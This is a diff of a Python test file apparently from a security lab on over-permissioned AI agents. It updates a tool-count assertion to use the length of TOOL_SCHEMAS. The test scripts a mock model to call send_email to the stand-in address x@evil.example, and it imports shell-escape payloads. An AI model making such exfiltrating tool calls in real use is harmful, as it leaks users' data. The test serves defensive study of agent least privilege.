@@ -3,7 +3,7 @@ import pytest
 
 from agent.llm import MockModel, ModelReply
 from agent.loop import run_agent
-from agent.tools import Tools
+from agent.tools import TOOL_SCHEMAS, Tools
 from attacks.s2_over_permissioned.payloads import SHELL_ESCAPES, read_paths
 from fixes.s2_least_privilege import HARDENING, PROFILES
 
@@ -137,7 +137,7 @@ def test_without_grant_all_tools_are_exposed_and_work(box, sink):
     cfg, _ = box
     model = Recorder([("send_email", {"to": "x@evil.example", "subject": "s", "body": "b"})])
     run_agent("Summarise notes.txt", model, cfg)
-    assert len(model.shown) == 5
+    assert len(model.shown) == len(TOOL_SCHEMAS)
     assert [r["path"] for r in sink.captured] == ["/email"]
 
 
